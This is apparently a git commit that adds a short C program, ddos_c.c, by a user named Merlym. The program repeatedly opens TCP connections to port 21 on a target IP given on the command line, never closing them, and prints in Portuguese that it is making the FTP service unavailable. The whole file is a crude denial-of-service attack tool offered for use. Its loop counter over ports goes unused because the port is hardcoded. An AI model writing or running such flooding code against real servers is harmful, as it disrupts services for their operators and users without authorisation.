e5bcd1ce4a4708f2844a023253b42260bd25fbdf
Merlym <69481833+Merlym@users.noreply.github.com>
2022-02-28 10:27:15 -0300

    ddos_c
    ddos_c

---
+++ ddos_c.c
@@ -0,0 +1,31 @@
+#include <stdio.h>
+#include <sys/socket.h>
+#include <netdb.h>
+
+int main(int argc, char *argv[]){
+
+	int meusocket;
+	int conecta;
+
+	int porta;
+	int inicio = 0;
+	int final = 65535;
+	char *destino = argv[1];
+
+	struct sockaddr_in alvo;
+
+	for(porta=inicio;porta<final;porta++){
+
+	meusocket = socket(AF_INET,SOCK_STREAM,0);
+	alvo.sin_family = AF_INET;
+	alvo.sin_port = htons(21);
+	alvo.sin_addr.s_addr = inet_addr(destino);
+
+	conecta = connect(meusocket, (struct sockaddr *)&alvo, sizeof alvo);
+
+	if(conecta == 0){
+		printf("Tornando serviço FTP indisponível! \n");
+
+	}
+}
+}
